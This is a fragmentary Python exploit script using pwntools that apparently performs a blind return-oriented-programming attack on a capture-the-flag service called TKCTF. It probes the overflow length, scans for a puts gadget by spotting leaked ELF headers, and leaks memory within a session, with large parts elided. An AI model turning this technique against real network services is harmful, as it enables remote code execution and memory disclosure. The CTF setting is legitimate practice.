...
def get_overflow_length():
    ...
    while True:
        try:
            ...
            r = remote(host, port)
            r.recvuntil(b'Welcome to TKCTF! Do you know the password? (Please overflow me. Please.)\n')
            r.sendline(b'a' * i)
            output = r.recv()
            r.close()
...
def find_puts(offset, rdi_ret, stop_gadget):
    ...
    while True:
        try:
            ...
            content = r.recvuntil(b'Welcome')
            log.debug('content: {}'.format(content))
            if b'\x7fELF' in content and b'Welcome' in content:
                return addr
            r.close()
            addr += 1
        except EOFError:
...
def same_session_leak(r, offset, addr, rdi_ret, puts, main=None):
    ...
    while len(res) < 8:
        ...
        try:
            content = r.recvuntil(b'Welcome to TKCTF! Do you know the password? (Please overflow me. Please.)\n')
        except EOFError:
            sleep(0.5)
            continue
        try:
